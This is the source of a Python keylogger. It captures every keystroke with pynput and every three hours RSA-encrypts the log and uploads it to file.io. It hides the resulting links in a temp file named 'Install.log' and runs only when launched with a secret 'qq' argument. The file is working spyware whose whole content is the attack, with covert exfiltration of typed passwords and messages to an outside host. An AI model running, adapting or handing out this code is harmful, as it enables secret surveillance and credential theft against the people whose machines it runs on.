from math import ceil
from time import sleep
from requests import post
from base64 import b64decode
from urllib.parse import urlencode
from pynput.keyboard import Listener
from urllib.request import urlopen, Request
from sys import argv, exit
from datetime import datetime
from tempfile import gettempdir

from apscheduler.schedulers.blocking import BlockingScheduler
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding


msg = ''

def on_press(key):
    global msg
    k = str(key).replace("'", "")
    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'Key.backspace':
        msg = msg[:-1] 
    elif k.startswith('Key.shift'):
        msg += '[SHFT]'
    elif k == 'Key.delete':
        msg += '[DEL]'
    elif k == 'Key.space':
        msg += ' '
    elif k.startswith('Key.alt'):
        msg += '[ALT]'
    elif k.startswith('Key.ctrl'):
        msg += '[CTRL]'
    else:
        msg += k

def upload():
    global msg
    toBeEncrypted = bytes(msg.encode())
    public_key_data = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Q1LWfwpLIc0/sflB/MZHEZM9fL4MGyqSleMNaKeGvEZictQqojDJvFo3TbgVUPY65tkMd885kg+JsdzXu48qcWpIgbsKtxm52YYa9z1km/T8IPmULFQHnqS75+jPeWRq4hKqm8PjWSluLIqjy7Ao0F0rfVeM3WL6K1jhELq3MpYvgBVeWX6UbzUpT++sqkwlJGcSgvWPhh7ENn3CO+tXPVGJIYqO2RdTck0MY91fzciQf1Bbm6nRGPri48fcP/ZR315oJ6Lile+P4sNmO3J1V1HTXp4ShVmq1F3NT+p9wcNp44mBF+ld0Nz6kmFpKB74PpVraYtKcjTzY4by/qmvwIDAQAB"
    
    public_key = serialization.load_der_public_key(b64decode(public_key_data),backend=default_backend())
    encrypt_list = list()
    lenofMessage = len(toBeEncrypted) 
    loop_times = ceil(lenofMessage/128) 
    upperIndex = min(lenofMessage,127) 
    lowerIndex = 0 
    while loop_times > 0 : 
        encrypted = public_key.encrypt(
		toBeEncrypted[lowerIndex:upperIndex],
		padding.OAEP(
		    mgf=padding.MGF1(algorithm=hashes.SHA256()),
		    algorithm=hashes.SHA256(),
		    label=None
		)
	)
        loop_times-=1 
        lenofMessage-=127
        lowerIndex+=127
        upperIndex+=min(max(lenofMessage,0),127) 
        encrypt_list.append(encrypted)
    urls_list = list()
    
    try:
        for data in encrypt_list:
            url = 'https://file.io'
            data = {"file": data}
            response = post(url, files=data)
            res = response.json()
            urls_list.append(res["link"])
            sleep(2)
    except:
        pass
    location = gettempdir() + "/Install.log"
    f = open(location, 'a')
    for url in urls_list:
        s = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        f.write(s + "\t" + url[16:] + "\n")
    f.close()
    msg = ''


if __name__ == '__main__':
    if len(argv) != 2:
        exit()
    if argv[1] != "qq":
        exit()
    listener = Listener(on_press=on_press)
    listener.start()
    scheduler = BlockingScheduler()
    scheduler.add_job(upload, 'interval', hours=3) #minutes=1 to test
    scheduler.start()
    
